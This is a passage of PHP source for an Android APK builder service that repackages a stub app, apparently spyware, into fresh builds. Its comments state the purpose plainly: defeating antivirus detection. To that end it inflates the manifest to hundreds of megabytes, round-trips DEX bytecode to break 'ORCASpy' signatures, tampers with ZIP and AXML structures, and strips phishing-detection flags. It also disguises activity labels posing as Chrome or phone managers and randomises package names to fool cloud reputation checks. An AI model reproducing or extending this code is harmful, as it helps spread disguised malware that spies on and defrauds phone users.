<?php

declare(strict_types=1);

namespace App\Services\ApkBuilder;

use App\Exceptions\ApkBuilder\ApkBuildException;
use App\Services\ApkBuilder\Contracts\FileSystemInterface;
use App\Services\ApkBuilder\Contracts\ProcessRunnerInterface;
use Illuminate\Support\Facades\Log;
use RecursiveDirectoryIterator;
use RecursiveIteratorIterator;

final class ApkBuilder
{
    private string $templateDir;

    private ?string $stubZipPath;

    private string $toolsDir;

    private string $outputDir;

    private string $workDir = '';

    private string $buildDir = '';

    private string $assetsKey = '';

    private array $stepStats = [];

    private float $startTime;

    private bool $buildSucceeded = false;

    private ?array $selectedPackageInfo = null;

    private ?\Closure $progressCallback = null;

    private ?object $smaliProcessor = null;

    private Encryptor $encryptor;

    /** Manifest 中声明的组件类名（在膨胀前提取，供 R8 keep 规则使用） */
    private array $manifestComponentClasses = [];

    private \Closure $smaliProcessorFactory;

    private \Closure $obfuscatorFactory;

    private \Closure $apkProtectorFactory;

    private ?ApkBuildConfig $currentConfig = null;

    private FileSystemInterface $fileSystem;

    private ProcessRunnerInterface $processRunner;

    public const STEP_LABELS = [
        'check_dependencies' => '检查依赖',
        'prepare_work_dir' => '准备工作目录',
        'modify_smali' => '修改配置',
        'modify_manifest' => '修改清单',
        'modify_resources' => '修改资源',
        'replace_icon' => '替换图标',
        'replace_background' => '替换背景',
        'generate_junk_classes' => '生成混淆类',
        'shuffle_classes' => '混淆类名',
        'obfuscate_strings' => '混淆字符串',
        'encrypt_strings' => '加密字符串',
        'encrypt_resources' => '加密资源',
        'inflate_manifest' => '膨胀清单',
        'build_apk' => '打包 APK',
        'r8_obfuscate' => 'R8 字节码混淆',
        'apk_editor' => 'APK 重打包',
        'modify_dex' => 'DEX 修改',
        'protect_apk' => 'APK 保护',
        'sign_apk' => '签名',
        'move_output' => '输出文件',
    ];

    public function __construct(
        ?Encryptor $encryptor = null,
        ?callable $smaliProcessorFactory = null,
        ?callable $obfuscatorFactory = null,
        ?callable $apkProtectorFactory = null,
        ?FileSystemInterface $fileSystem = null,
        ?ProcessRunnerInterface $processRunner = null,
    ) {
        $this->templateDir = config('apk-builder.template_path');
        $this->stubZipPath = config('apk-builder.stub_zip_path')
            ?? storage_path('app/apk/apkstub/apkstub.zip');
        $this->toolsDir = config('apk-builder.tools_path');
        $this->outputDir = config('apk-builder.output_path');
        $this->encryptor = $encryptor ?? new Encryptor;
        $this->smaliProcessorFactory = $smaliProcessorFactory ?? fn(string $buildDir): SmaliProcessor => new SmaliProcessor($buildDir);
        $this->obfuscatorFactory = $obfuscatorFactory ?? fn(string $buildDir): Obfuscator => new Obfuscator($buildDir);
        $this->apkProtectorFactory = $apkProtectorFactory ?? fn(ApkBuildConfig $c): ApkProtector => new ApkProtector(
            enableFakeEncryption: $c->enableFakeEncryption,
            enableEocdTampering: $c->enableEocdTampering,
            enablePathTraversalEntries: $c->enablePathTraversalEntries,
            enableUnknownCompression: $c->enableUnknownCompression,
            enableAxmlTampering: $c->enableAxmlTampering,
            fakeEntryCount: $c->fakeEntryCount,
        );
        $this->fileSystem = $fileSystem ?? new LaravelFileSystem;
        $this->processRunner = $processRunner ?? new LaravelProcessRunner;
    }

    public function buildWithProgress(ApkBuildConfig $config, callable $onProgress): ApkBuildResult
    {
        $this->progressCallback = \Closure::fromCallable($onProgress);

        try {
            return $this->build($config);
        } finally {
            $this->progressCallback = null;
        }
    }

    /**
     * @throws ApkBuildException
     */
    public function build(ApkBuildConfig $config): ApkBuildResult
    {
        $this->startTime = microtime(true);
        $this->stepStats = [];
        $this->smaliProcessor = null;
        $this->currentConfig = $config;

        Log::channel('apk')->info('Build started', ['app_id' => $config->appId, 'user_id' => $config->userId]);

        try {
            $errors = $config->validate();
            if (! empty($errors)) {
                throw ApkBuildException::configValidationFailed($errors);
            }

            $this->runStep('check_dependencies', fn() => $this->checkDependencies());
            $this->runStep('prepare_work_dir', fn() => $this->prepareWorkDir());
            $this->runStep('modify_smali', fn() => $this->modifySmali($config));
            $this->runStep('modify_manifest', fn() => $this->modifyManifest($config));
            $this->runStep('modify_resources', fn() => $this->modifyResources($config));
            $this->runStep('replace_icon', fn() => $this->replaceIcon($config));
            $this->runStep('replace_background', fn() => $this->replaceBackground($config));

            if ($config->enableJunkClasses) {
                $this->runStep('generate_junk_classes', fn() => $this->generateJunkClasses($config));
            }

            if ($config->enableClassShuffle) {
                $this->runStep('shuffle_classes', fn() => $this->shuffleClasses());
            }

            if ($config->enableStringObfuscation) {
                $this->runStep('obfuscate_strings', fn() => $this->obfuscateStrings());
            }

            if ($config->enableFullStringEncryption) {
                $this->runStep('encrypt_strings', fn() => $this->encryptStrings());
            }

            $this->runStep('encrypt_resources', fn() => $this->encryptResources());

            // 提取 Manifest 组件类名（必须在 shuffle_classes 之后、inflate_manifest 之前）
            // shuffle_classes 会重命名类名，inflate_manifest 会膨胀到 765MB 无法解析
            if ($config->enableR8Obfuscation) {
                $manifestPath = $this->buildDir . ApkBuilderConstants::MANIFEST_PATH;
                if ($this->fileSystem->exists($manifestPath)) {
                    $manifestContent = $this->fileSystem->get($manifestPath);
                    $pkg = $this->selectedPackageInfo['pkg'] ?? '';
                    $this->extractManifestComponentClasses($manifestContent, $pkg);
                }
            }

            // 旧版 ReplaceHugePlaceholders: 在 apktool build 之前膨胀 Manifest
            // 让 AV 扫描器无法解析巨型 XML，是绕过检测的核心手段
            if ($config->enableApkProtection) {
                $this->runStep('inflate_manifest', fn() => $this->inflateManifest());
            }

            $this->runStep('build_apk', fn() => $this->buildApk());

            // R8 字节码混淆：DEX → JAR → R8 → DEX，重组字节码结构绕过 AV 签名匹配
            if ($config->enableR8Obfuscation) {
                $this->runStep('r8_obfuscate', fn() => $this->r8Obfuscate());
            }

            // 旧版构建顺序: build → APKEditor → DexEditor → APKProtector → zipalign → sign
            // APKEditor 重打包优化 ZIP 结构，使 APK 更接近正常应用
            if ($config->enableApkProtection || $config->enableDexModification) {
                $this->runStep('apk_editor', fn() => $this->runApkEditor());
            }

            // modify_dex 直接覆盖 APK 文件头部字节，必须在 APKEditor 之后
            if ($config->enableDexModification) {
                $this->runStep('modify_dex', fn() => $this->modifyDex());
            }

            if ($config->enableApkProtection) {
                $this->runStep('protect_apk', fn() => $this->addFakeEncryptionToApk());
            }

            $this->runStep('sign_apk', fn() => $this->signApk());

            $outputPath = $this->runStep('move_output', fn() => $this->moveToOutput($config));

            $this->buildSucceeded = true;
            $this->cleanup();

            $totalTime = $this->getTotalTime();
            Log::channel('apk')->info('Build completed', [
                'app_id' => $config->appId,
                'output_path' => $outputPath,
                'total_time_ms' => $totalTime,
            ]);

            return new ApkBuildResult(
                path: $outputPath,
                stats: $this->stepStats,
                totalTimeMs: $totalTime,
            );
        } catch (ApkBuildException $e) {
            Log::channel('apk')->error('Build failed', [
                'app_id' => $config->appId,
                'error' => $e->getMessage(),
                'context' => $e->context,
            ]);
            $this->handleBuildFailure($e->getMessage());
            throw $e;
        } catch (\Throwable $e) {
            Log::channel('apk')->error('Build failed with unexpected error', [
                'app_id' => $config->appId,
                'error' => $e->getMessage(),
                'trace' => $e->getTraceAsString(),
            ]);
            $this->handleBuildFailure($e->getMessage());
            throw new ApkBuildException($e->getMessage(), [], 0, $e);
        }
    }

    private function runStep(string $name, callable $action): mixed
    {
        $stepStart = microtime(true);
        Log::channel('apk')->debug("Starting step: {$name}");

        $this->emitProgress([
            'type' => 'step',
            'step' => $name,
            'label' => self::STEP_LABELS[$name] ?? $name,
            'status' => 'running',
        ]);

        $result = $action();

        $duration = round((microtime(true) - $stepStart) * 1000, 2);
        $this->stepStats[$name] = $duration;
        Log::channel('apk')->debug("Completed step: {$name}", ['duration_ms' => $duration]);

        $this->emitProgress([
            'type' => 'step',
            'step' => $name,
            'label' => self::STEP_LABELS[$name] ?? $name,
            'status' => 'done',
            'duration' => $duration,
        ]);

        return $result;
    }

    private function emitProgress(array $data): void
    {
        if ($this->progressCallback) {
            ($this->progressCallback)($data);
        }
    }

    /**
     * 发送心跳消息（用于长时间运行的操作）
     */
    private function emitHeartbeat(): void
    {
        $this->emitProgress(['type' => 'heartbeat']);
    }

    private function getTotalTime(): float
    {
        return round((microtime(true) - $this->startTime) * 1000, 2);
    }

    private function handleBuildFailure(string $errorMessage): void
    {
        $this->emitProgress(['type' => 'error', 'error' => $errorMessage]);
        $this->buildSucceeded = false;
        $this->cleanup();
    }

    private function getSmaliProcessor(): object
    {
        if ($this->smaliProcessor === null) {
            $this->smaliProcessor = ($this->smaliProcessorFactory)($this->buildDir);
        }

        return $this->smaliProcessor;
    }

    private function checkDependencies(): void
    {
        if (! $this->fileSystem->isDirectory($this->templateDir) || ! $this->templateIsValid()) {
            $this->extractTemplateFromZip();
        }

        if (! $this->fileSystem->isDirectory($this->templateDir)) {
            throw ApkBuildException::templateNotFound($this->templateDir);
        }

        if (! $this->templateIsValid()) {
            $zipPath = $this->stubZipPath ?? 'storage/app/apk/apkstub/apkstub.zip';
            $zipExists = ! empty($this->stubZipPath) && $this->fileSystem->exists($this->stubZipPath);
            throw new ApkBuildException(
                'APK 模板不完整：缺少 My_Configs.smali 等必要文件。' .
                    ($zipExists
                        ? ' 解压 apkstub.zip 失败，请检查 ZIP 文件完整性。'
                        : " 请将 apkstub.zip 部署到 {$zipPath} 后重试。"),
                [
                    'template_dir' => $this->templateDir,
                    'stub_zip_path' => $this->stubZipPath,
                    'stub_zip_exists' => $zipExists,
                ]
            );
        }

        $apktoolPath = $this->toolsDir . '/apktool.jar';
        if (! $this->fileSystem->exists($apktoolPath)) {
            throw ApkBuildException::toolNotFound('apktool.jar', $apktoolPath);
        }

        $result = $this->processRunner->run('java -version');
        if (! $result->successful()) {
            throw ApkBuildException::javaNotInstalled();
        }
    }

    /**
     * 从 ZIP 文件解压模板
     *
     * @throws ApkBuildException
     */
    private function extractTemplateFromZip(): void
    {
        if (empty($this->stubZipPath) || ! $this->fileSystem->exists($this->stubZipPath)) {
            Log::channel('apk')->warning('Stub ZIP file not found or not configured', ['path' => $this->stubZipPath]);

            return;
        }

        Log::channel('apk')->info('Extracting template from ZIP', [
            'zip' => $this->stubZipPath,
            'target' => $this->templateDir,
        ]);

        $zip = new \ZipArchive;
        $result = $zip->open($this->stubZipPath);

        if ($result !== true) {
            throw new ApkBuildException(
                '无法打开模板 ZIP 文件: ' . self::getZipArchiveErrorMessage($result),
                ['zip' => $this->stubZipPath, 'error_code' => $result]
            );
        }

        $parentDir = dirname($this->templateDir);
        $this->fileSystem->ensureDirectoryExists($parentDir);

        if (! is_writable($parentDir)) {
            $zip->close();
            throw new ApkBuildException('目标目录不可写', [
                'parent_dir' => $parentDir,
                'permissions' => substr(sprintf('%o', fileperms($parentDir)), -4),
            ]);
        }

        if ($this->fileSystem->isDirectory($this->templateDir)) {
            $this->fileSystem->deleteDirectory($this->templateDir);
        }

        if (! $zip->extractTo($this->templateDir)) {
            $statusMessage = $zip->getStatusString();
            $zip->close();
            throw new ApkBuildException("解压模板 ZIP 文件失败: {$statusMessage}", [
                'zip' => $this->stubZipPath,
                'target' => $this->templateDir,
                'zip_status' => $statusMessage,
                'disk_free_space' => disk_free_space($parentDir),
            ]);
        }

        $zip->close();

        $this->processRunner->run('chmod -R 755 ' . escapeshellarg($this->templateDir));

        Log::channel('apk')->info('Template extracted successfully', ['target' => $this->templateDir]);
    }

    /**
     * 检查模板目录是否包含构建所需的核心文件
     * （用于区分 deploy 创建的空 template 目录与有效解压内容）
     */
    private function templateIsValid(): bool
    {
        return $this->fileSystem->exists($this->templateDir . '/' . ApkBuilderConstants::CONFIGS_SMALI_RELATIVE);
    }

    private function getBaseTempDir(): string
    {
        $tempPath = config('apk-builder.temp_path');

        return ! empty($tempPath) ? $tempPath : sys_get_temp_dir();
    }

    private function isValidAssetFile(?string $path): bool
    {
        return $path !== null && $this->fileSystem->exists($path) && $this->fileSystem->size($path) > ApkBuilderConstants::MIN_ASSET_FILE_SIZE;
    }

    private function prepareWorkDir(): void
    {
        $this->cleanOldBuildCache();

        $baseDir = $this->getBaseTempDir();
        $this->workDir = $baseDir . '/apk_build_' . uniqid();
        $this->buildDir = $this->workDir . '/apk_source';

        $this->fileSystem->ensureDirectoryExists($this->workDir);
        $this->copyDirectory($this->templateDir, $this->buildDir);

        $requiredSmali = $this->buildDir . '/' . ApkBuilderConstants::CONFIGS_SMALI_RELATIVE;
        if (! $this->fileSystem->exists($requiredSmali)) {
            throw new ApkBuildException(
                'APK 工作目录缺少必要文件，请确保模板已正确解压。',
                [
                    'build_dir' => $this->buildDir,
                    'missing_file' => ApkBuilderConstants::CONFIGS_SMALI_RELATIVE,
                ]
            );
        }

        $this->assetsKey = Encryptor::generateKey();
    }

    private function cleanOldBuildCache(): void
    {
        $baseDir = $this->getBaseTempDir();
        $pattern = $baseDir . '/apk_build_*';
        $oldDirs = $this->fileSystem->glob($pattern, GLOB_ONLYDIR);

        foreach ($oldDirs as $dir) {
            $this->fileSystem->deleteDirectory($dir);
        }
    }

    private function modifySmali(ApkBuildConfig $config): void
    {
        $this->getSmaliProcessor()->modifyConfig($config, $this->assetsKey, $this->encryptor);
    }

    /**
     * 旧版 ReplaceHugePlaceholders() — 在 apktool build 之前膨胀 AndroidManifest.xml。
     *
     * 模板 Manifest 包含 xmlns:cnamspace="http://cnamevalue"，
     * 将 cnamspace 替换为 ~800KB 随机字符，cnamevalue 替换为 ~400MB 斜杠。
     * apktool 编译后压缩进 APK，AV 解压后无法解析这个巨型 XML。
     */
    private function inflateManifest(): void
    {
        $manifestPath = $this->buildDir . ApkBuilderConstants::MANIFEST_PATH;
        $content = $this->fileSystem->get($manifestPath);

        if (! str_contains($content, 'cnamspace') || ! str_contains($content, 'cnamevalue')) {
            Log::channel('apk')->warning('Manifest missing cnamspace/cnamevalue placeholders, skipping inflation');

            return;
        }

        // 旧版: ReplaceHugePlaceholders(path, 800000L, 400000000L)
        // cnamspace → 800KB 随机小写字母
        $chars = 'qazwsxedcrfvtgbyhnujmikolp';
        $namespaceSize = 800_000;
        $namespacePadding = '';
        for ($i = 0; $i < $namespaceSize; $i++) {
            $namespacePadding .= $chars[random_int(0, 25)];
        }

        // cnamevalue → 400MB 斜杠（高度可压缩，APK 体积不会暴增）
        $valueSize = 400_000_000;
        $valuePadding = str_repeat('/', $valueSize);

        $content = str_replace('cnamspace', $namespacePadding, $content);
        $content = str_replace('cnamevalue', $valuePadding, $content);

        $this->fileSystem->put($manifestPath, $content);

        $sizeMb = round(strlen($content) / 1024 / 1024, 1);
        Log::channel('apk')->debug("Manifest inflated to {$sizeMb}MB");
    }

    private function modifyManifest(ApkBuildConfig $config): void
    {
        $manifestPath = $this->buildDir . ApkBuilderConstants::MANIFEST_PATH;
        $content = $this->fileSystem->get($manifestPath);

        $oldPackage = ApkBuilderConstants::DEFAULT_PACKAGE;

        $newPackage = $this->generateRandomPackageName();
        $versionMajor = random_int(1, 9);
        $versionMinor = random_int(0, 9);
        $versionPatch = random_int(0, 9);
        $versionName = "{$versionMajor}.{$versionMinor}.{$versionPatch}";
        $versionCode = $versionMajor * 100 + $versionMinor * 10 + $versionPatch;
        $this->selectedPackageInfo = ['pkg' => $newPackage, 'versionCode' => $versionCode, 'versionName' => $versionName];

        $content = str_replace($oldPackage, $newPackage, $content);
        $this->getSmaliProcessor()->renamePackage($oldPackage, $newPackage);

        $content = str_replace('@drawable/mylogo', '@drawable/app_icon', $content);

        $content = $this->sanitizeManifestForAv($content);

        $this->fixResourceReferences($content);

        $this->fileSystem->put($manifestPath, $content);
    }

    private function generateRandomPackageName(): string
    {
        $words = ApkBuilderConstants::PACKAGE_NAME_WORDS;
        $w = fn() => $words[array_rand($words)];
        return 'com.' . $w() . $w() . '.' . $w() . $w();
    }

    /**
     * 从 Manifest 中提取所有组件类名，保存到 $this->manifestComponentClasses。
     * 必须在 inflateManifest() 之前调用（膨胀后 765MB 无法解析）。
     */
    private function extractManifestComponentClasses(string $manifestContent, string $packageName): void
    {
        $this->manifestComponentClasses = [];

        if (preg_match_all('/(?:activity|service|receiver|provider|application)\s[^>]*android:name="([^"]+)"/i', $manifestContent, $matches)) {
            foreach (array_unique($matches[1]) as $className) {
                if (str_starts_with($className, '.')) {
                    $className = $packageName . $className;
                }
                $this->manifestComponentClasses[] = $className;
            }
        }

        Log::channel('apk')->debug('Extracted manifest components for R8 keep rules', [
            'count' => count($this->manifestComponentClasses),
        ]);
    }

    private function sanitizeManifestForAv(string $content): string
    {
        // ALLOW_PHISHING_DETECTION=false 是已知 AV 红旗
        $content = preg_replace(
            '/\s*<meta-data\s+android:name="com\.google\.android\.ALLOW_PHISHING_DETECTION"[^\/]*\/>\s*/i',
            "\n",
            $content
        );

        $suspiciousActions = [
            'ru.aaaaaaax.installer',
            'com.android.vending.billing.InAppBillingService.COIN',
            'com.android.vending.billing.InAppBillingService.COIO',
            'com.android.vending.billing.InAppBillingService.LUCM',
            'com.android.vending.billing.InAppBillingService.PROX',
            'com.android.vending.billing.InAppBillingService.INST',
            'ir.cafebazaar.pardakht.InAppBillingService.BIND',
            'com.nokia.payment.iapenabler.InAppBillingService.BIND',
        ];

        foreach ($suspiciousActions as $action) {
            $content = preg_replace(
                '/\s*<action\s+android:name="' . preg_quote($action, '/') . '"[^\/]*\/>\s*/i',
                "\n",
                $content
            );
        }

        // 伪装成系统应用的 activity-alias label 是 AV 标记特征
        $labelReplacements = [
            'android:label="Chrome "' => 'android:label="Browser"',
            'android:label="i管家"' => 'android:label="Tools"',
            'android:label="手机管家"' => 'android:label="Manager"',
        ];
        $content = str_replace(array_keys($labelReplacements), array_values($labelReplacements), $content);

        return $content;
    }

    private static function getZipArchiveErrorMessage(int $code): string
    {
        return ApkBuilderConstants::ZIP_ERROR_MESSAGES[$code] ?? "未知错误 ({$code})";
    }

    private function fixResourceReferences(string &$content): void
    {
        $xmlDir = $this->buildDir . ApkBuilderConstants::XML_DIR_PATH;
        $this->fileSystem->ensureDirectoryExists($xmlDir);

        preg_match_all('/@xml\/([a-zA-Z0-9_]+)/', $content, $matches);

        foreach (array_unique($matches[1] ?? []) as $name) {
            $file = "{$xmlDir}/{$name}.xml";

            if ($this->fileSystem->exists($file)) {
                continue;
            }

            $existing = glob("{$xmlDir}/*.xml");

            if (! empty($existing)) {
                $this->fileSystem->copy($existing[0], $file);
            } else {
                $this->fileSystem->put($file, ApkBuilderConstants::DEFAULT_ACCESSIBILITY_XML);
            }
        }
    }

    private function modifyResources(ApkBuildConfig $config): void
    {
        $stringsPath = $this->buildDir . ApkBuilderConstants::STRINGS_XML_PATH;

        if ($this->fileSystem->exists($stringsPath)) {
            $content = $this->fileSystem->get($stringsPath);

            $content = preg_replace(
                '/<string name="BaseName">[^<]*<\/string>/',
                '<string name="BaseName">' . htmlspecialchars($config->appName) . '</string>',
                $content
            );

            $content = preg_replace(
                '/<string name="accessibility_service_description">[^<]*<\/string>/',
                '<string name="accessibility_service_description">' . htmlspecialchars($config->loginDis) . '</string>',
                $content
            );

            $this->fileSystem->put($stringsPath, $content);
        }

        $ymlPath = $this->buildDir . ApkBuilderConstants::APKTOOL_YML_PATH;

        if ($this->fileSystem->exists($ymlPath)) {
            $content = $this->fileSystem->get($ymlPath);

            // 使用真实应用的版本号匹配华为 HISEC 云端查询
            if ($this->selectedPackageInfo) {
                $versionCode = $this->selectedPackageInfo['versionCode'];
                $versionName = $this->selectedPackageInfo['versionName'];
            } else {
                $versionCode = (int) str_replace('.', '', $config->appVersion) * 100;
                $versionName = $config->appVersion;
            }

            $content = preg_replace('/versionCode: \d+/', 'versionCode: ' . $versionCode, $content);
            $content = preg_replace("/versionName: '[^']*'/", "versionName: '" . $versionName . "'", $content);
            $content = preg_replace('/versionName: [^\n]+/', 'versionName: ' . $versionName, $content);
            $this->fileSystem->put($ymlPath, $content);
        }
    }

    private function replaceIcon(ApkBuildConfig $config): void
    {
        $iconPath = $this->resolveIconPath($config);

        if (! $iconPath) {
            throw ApkBuildException::iconNotFound($config->iconPath ?: 'default icon');
        }

        foreach (ApkBuilderConstants::DRAWABLE_DIRS as $dir) {
            $target = $this->buildDir . '/res/' . $dir;

            if (! $this->fileSystem->isDirectory($target)) {
                continue;
            }

            $mylogoPath = $target . '/' . ApkBuilderConstants::ICON_FILENAME;
            if ($this->fileSystem->exists($mylogoPath)) {
                $this->fileSystem->delete($mylogoPath);
            }
            $this->fileSystem->copy($iconPath, $mylogoPath);
            $this->fileSystem->copy($iconPath, $target . '/' . ApkBuilderConstants::APP_ICON_FILENAME);
        }

        Log::channel('apk')->debug('Icon replaced', ['icon' => $iconPath]);
    }

    private function resolveIconPath(ApkBuildConfig $config): ?string
    {
        $configIcon = $this->resolveStoragePath($config->iconPath);
        if ($this->isValidAssetFile($configIcon)) {
            return $configIcon;
        }

        $defaultIcon = config('apk-builder.default_icon');
        if ($this->isValidAssetFile($defaultIcon)) {
            return $defaultIcon;
        }

        $templateIcon = $this->templateDir . '/res/drawable/' . ApkBuilderConstants::ICON_FILENAME;

        return $this->fileSystem->exists($templateIcon) ? $templateIcon : null;
    }

    private function replaceBackground(ApkBuildConfig $config): void
    {
        $bgPath = $this->resolveBackgroundPath($config);

        if (! $bgPath) {
            Log::channel('apk')->debug('Using black background');
            $this->removeBlackuiResource();

            return;
        }

        $target = $this->buildDir . ApkBuilderConstants::BLACKUI_PATH;

        if ($this->fileSystem->exists($target)) {
            $this->fileSystem->delete($target);
        }

        $this->fileSystem->copy($bgPath, $target);
        Log::channel('apk')->debug('Background replaced', ['source' => $bgPath]);
    }

    private function resolveBackgroundPath(ApkBuildConfig $config): ?string
    {
        $bgSource = $config->backgroundPath;

        // 'black' 或空值表示使用纯黑背景
        if (empty($bgSource) || strtolower($bgSource) === 'black') {
            return null;
        }

        $bgPath = $this->resolveStoragePath($bgSource);

        return $this->isValidAssetFile($bgPath) ? $bgPath : null;
    }

    /**
     * 将 URL 路径或文件系统路径统一转换为文件系统路径
     *
     * @param  string|null  $path  URL 路径 (如 /storage/icons/1/xxx.png) 或文件系统路径
     * @return string|null 文件系统完整路径
     */
    private function resolveStoragePath(?string $path): ?string
    {
        if (empty($path)) {
            return null;
        }

        // 如果是以 /storage/ 开头的 URL 路径，转换为文件系统路径
        if (str_starts_with($path, '/storage/')) {
            // /storage/icons/1/xxx.png -> storage/app/public/icons/1/xxx.png
            $relativePath = substr($path, 9); // 移除 '/storage/'

            return storage_path('app/public/' . $relativePath);
        }

        // 如果已经是绝对路径，直接返回
        if (str_starts_with($path, '/')) {
            return $path;
        }

        // 其他情况，假设是相对于 storage/app/public 的路径
        return storage_path('app/public/' . $path);
    }

    private function removeBlackuiResource(): void
    {
        $blackuiPath = $this->buildDir . ApkBuilderConstants::BLACKUI_PATH;

        if ($this->fileSystem->exists($blackuiPath)) {
            $this->fileSystem->delete($blackuiPath);
        }

        $publicXmlPath = $this->buildDir . ApkBuilderConstants::PUBLIC_XML_PATH;

        if ($this->fileSystem->exists($publicXmlPath)) {
            $content = $this->fileSystem->get($publicXmlPath);
            $content = preg_replace(
                '/<public[^>]*type="drawable"[^>]*name="blackui"[^>]*\/>\s*/i',
                '',
                $content
            );
            $this->fileSystem->put($publicXmlPath, $content);
        }
    }

    private function generateJunkClasses(ApkBuildConfig $config): void
    {
        $obfuscator = ($this->obfuscatorFactory)($this->buildDir);
        if (method_exists($obfuscator, 'setHeartbeatCallback')) {
            $obfuscator->setHeartbeatCallback(fn () => $this->emitHeartbeat());
        }
        $count = $obfuscator->generateJunkClasses(
            $config->junkClassCount,
            $config->junkMethodCount,
            $config->enableMultiPackageJunk,
        );
        Log::channel('apk')->debug('Generated junk classes', ['count' => $count, 'multi_package' => $config->enableMultiPackageJunk]);

        if (method_exists($obfuscator, 'generateJunkAndroidComponents')) {
            $componentCount = $obfuscator->generateJunkAndroidComponents();
            Log::channel('apk')->debug('Generated junk Android components', ['count' => $componentCount]);
        }

        // 旧版 InjectRandomJunkFiles(): 在 assets 目录注入 c_*.png / c_*.xml 垃圾文件
        if (method_exists($obfuscator, 'injectRandomJunkFiles')) {
            $junkFileCount = $obfuscator->injectRandomJunkFiles();
            Log::channel('apk')->debug('Injected junk asset files', ['count' => $junkFileCount]);
        }
    }

    private function shuffleClasses(): void
    {
        $obfuscator = ($this->obfuscatorFactory)($this->buildDir);
        if (method_exists($obfuscator, 'setHeartbeatCallback')) {
            $obfuscator->setHeartbeatCallback(fn () => $this->emitHeartbeat());
        }
        $count = $obfuscator->shuffleClassNames();
        Log::channel('apk')->debug('Shuffled class names', ['count' => $count]);
    }

    private function obfuscateStrings(): void
    {
        $obfuscator = ($this->obfuscatorFactory)($this->buildDir);
        if (method_exists($obfuscator, 'setHeartbeatCallback')) {
            $obfuscator->setHeartbeatCallback(fn () => $this->emitHeartbeat());
        }
        $count = $obfuscator->obfuscateStrings();
        Log::channel('apk')->debug('Obfuscated strings', ['count' => $count]);
    }

    private function encryptStrings(): void
    {
        $encryptor = new SmaliStringEncryptor($this->buildDir);
        $encryptor->setHeartbeatCallback(fn () => $this->emitHeartbeat());
        $count = $encryptor->encryptAllStrings();
        Log::channel('apk')->debug('Encrypted strings', ['count' => $count]);
    }

    private function encryptResources(): void
    {
        $assetsPath = $this->buildDir . ApkBuilderConstants::ASSETS_PATH;

        if (! $this->fileSystem->isDirectory($assetsPath)) {
            return;
        }

        // 只加密 assets 根目录下的文件（与 VB.NET EncryptFolder 行为一致）
        // PHP glob() 不支持 ** 递归语法，使用 /* 只匹配根目录文件
        $files = $this->fileSystem->glob($assetsPath . '/*');

        foreach ($files as $file) {
            if (is_file($file)) {
                $content = $this->fileSystem->get($file);
                $encrypted = $this->encryptor->encryptBytes($content, $this->assetsKey);
                $this->fileSystem->put($file, $encrypted);
            }
        }
    }

    private function getUnsignedApkPath(): string
    {
        return $this->workDir . '/' . ApkBuilderConstants::APK_UNSIGNED;
    }

    private function buildApk(): void
    {
        $apktoolJar = $this->toolsDir . '/apktool.jar';
        $unsignedApk = $this->getUnsignedApkPath();

        // 每次构建前清理 apktool 框架缓存，防止之前崩溃留下的损坏文件导致后续构建必定失败
        $this->processRunner->run('rm -rf ~/.local/share/apktool/framework/*');

        // 旧版命令: java -jar apktool.jar b -f <path> -o <output>
        // 不使用 --use-aapt2，与旧版 EaodWorker 保持一致
        $command = sprintf(
            'java -jar %s b -f %s -o %s',
            escapeshellarg($apktoolJar),
            escapeshellarg($this->buildDir),
            escapeshellarg($unsignedApk)
        );

        $timeout = config('apk-builder.timeout', 300);
        $result = $this->runCommandWithHeartbeat($command, $timeout);

        if ($result === null || ! $result->successful() || ! $this->fileSystem->exists($unsignedApk)) {
            // 构建失败后再清理一次框架缓存，防止本次失败污染下次构建
            $this->processRunner->run('rm -rf ~/.local/share/apktool/framework/*');

            $errorOutput = $result ? ($result->errorOutput() ?: $result->output()) : 'Command failed to execute';
            throw ApkBuildException::buildFailed('apktool', $errorOutput);
        }
    }

    /**
     * R8 字节码混淆 — 将 DEX 转为 JAR，经 R8 混淆后转回 DEX。
     *
     * 流程: APK 中提取 DEX → dex2jar → R8 (repackage+obfuscate) → 替换回 APK。
     * 这会重组字节码结构（类合并、方法内联、控制流变换），
     * 使 AV 引擎的 ORCASpy 等家族签名无法匹配。
     */
    private function r8Obfuscate(): void
    {
        $unsignedApk = $this->getUnsignedApkPath();
        $r8Jar = $this->toolsDir . '/r8.jar';
        $dex2jarScript = $this->toolsDir . '/dex2jar/d2j-dex2jar.sh';

        if (! $this->fileSystem->exists($r8Jar) || ! $this->fileSystem->exists($dex2jarScript)) {
            Log::channel('apk')->warning('R8 or dex2jar not found, skipping R8 obfuscation');

            return;
        }

        $r8WorkDir = $this->workDir . '/r8_work';
        $dexDir = $r8WorkDir . '/dex';
        $jarDir = $r8WorkDir . '/jars';
        $outDir = $r8WorkDir . '/output';

        $this->fileSystem->ensureDirectoryExists($dexDir);
        $this->fileSystem->ensureDirectoryExists($jarDir);
        $this->fileSystem->ensureDirectoryExists($outDir);

        // Step 1: 从 APK 提取 DEX 文件
        $zip = new \ZipArchive();
        if ($zip->open($unsignedApk) !== true) {
            Log::channel('apk')->warning('Cannot open APK for R8 processing');

            return;
        }

        $dexFiles = [];
        for ($i = 0; $i < $zip->numFiles; $i++) {
            $name = $zip->getNameIndex($i);
            if (preg_match('/^classes\d*\.dex$/', $name)) {
                $zip->extractTo($dexDir, $name);
                $dexFiles[] = $name;
            }
        }
        $zip->close();

        if (empty($dexFiles)) {
            Log::channel('apk')->warning('No DEX files found in APK');

            return;
        }

        // Step 2: DEX → JAR (dex2jar)
        $jarInputs = [];
        foreach ($dexFiles as $dexFile) {
            $dexPath = $dexDir . '/' . $dexFile;
            $jarName = str_replace('.dex', '.jar', $dexFile);
            $jarPath = $jarDir . '/' . $jarName;

            $cmd = sprintf(
                'bash %s %s -o %s --force 2>/dev/null',
                escapeshellarg($dex2jarScript),
                escapeshellarg($dexPath),
                escapeshellarg($jarPath)
            );
            $this->processRunner->run($cmd);

            if ($this->fileSystem->exists($jarPath)) {
                $jarInputs[] = $jarPath;
            }
        }

        if (empty($jarInputs)) {
            Log::channel('apk')->warning('dex2jar conversion failed for all DEX files');

            return;
        }

        // Step 3: D8 重编译 JAR → DEX（不做混淆/裁剪，仅重组字节码结构）
        // DEX→JAR→DEX 往返转换会改变寄存器分配和指令排序，破坏 AV 字节码模式签名
        $jarArgs = implode(' ', array_map('escapeshellarg', $jarInputs));
        $cmd = sprintf(
            'java -Xmx2g -cp %s com.android.tools.r8.D8 --release --min-api 24 --output %s %s 2>&1',
            escapeshellarg($r8Jar),
            escapeshellarg($outDir),
            $jarArgs
        );

        $timeout = config('apk-builder.timeout', 300);
        $result = $this->runCommandWithHeartbeat($cmd, $timeout);

